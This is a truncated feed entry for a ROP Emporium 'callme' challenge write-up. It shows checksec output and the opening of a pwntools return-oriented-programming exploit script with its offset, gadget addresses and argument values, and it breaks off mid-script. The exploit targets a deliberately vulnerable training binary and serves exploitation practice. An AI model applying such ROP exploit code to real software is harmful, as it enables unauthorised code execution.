entry.title: ROP Emporium Callme Pwn
entry.summary:
gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial gdb-peda$
from pwn import *
LOCAL = False
if LOCAL: p = process("./callme") else: p = remote("127.0.0.1", 1337)
elf = ELF('./callme')
OFFSET = 40 pop_rdi = p64(0x00000000004009a3) ret = p64(0x00000000004006be)
arg1 = p64(0xdeadbeefdeadbeef) arg2 = p64(0xcafebabeca...
